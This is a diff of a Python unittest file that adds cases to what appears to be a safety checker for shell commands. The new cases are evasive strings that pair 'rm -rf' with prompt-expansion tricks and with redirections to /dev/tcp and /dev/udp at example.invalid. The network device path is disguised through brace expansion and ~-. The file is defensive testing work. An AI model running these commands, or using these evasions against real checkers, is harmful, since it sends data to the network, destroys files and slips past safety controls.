@@ -652,6 +652,9 @@ class StructuralAskTest(unittest.TestCase):
             "grep 'rm -rf' notes.md | tee > ${OUT:-/dev/tcp/example.invalid/80}",
             "cat > f <<EOF\n'${ cat list; }'\nEOF\ngrep 'rm -rf' notes.md", "cat <<EOF\n'${NAME@P}'\nEOF\ngrep 'rm -rf' f",
             "grep x f # it's\ngrep 'rm -rf' ${NAME@P}\ngrep y f # it's", "grep x f; # it's\ngrep 'rm -rf' f | tee $OUT\n# it's",
+            "grep \"It's\\\n${NAME@P}\" 'rm -rf' f", "grep 'rm -rf' f > \"a'b\\\nc\" ${NAME@P} 'x'",
+            "grep 'rm -rf' f > /de{v..v}/tcp/example.invalid/80", "grep 'rm -rf' f | tee > /de{v..v}/udp/example.invalid/53",
+            "grep 'rm -rf' f > ~-/tcp/example.invalid/80",
             "cd $TMPDIR/run && rm -rf ../x", "cd $TMPDIR/run && cd ~ && rm -f a", "cd /srv/run && rm -f a",
             "for f in a b; do f=$(cat x); cat $f; done", "for f in $(ls); do cat $f; done; echo \"$(date)\"",
         ]:
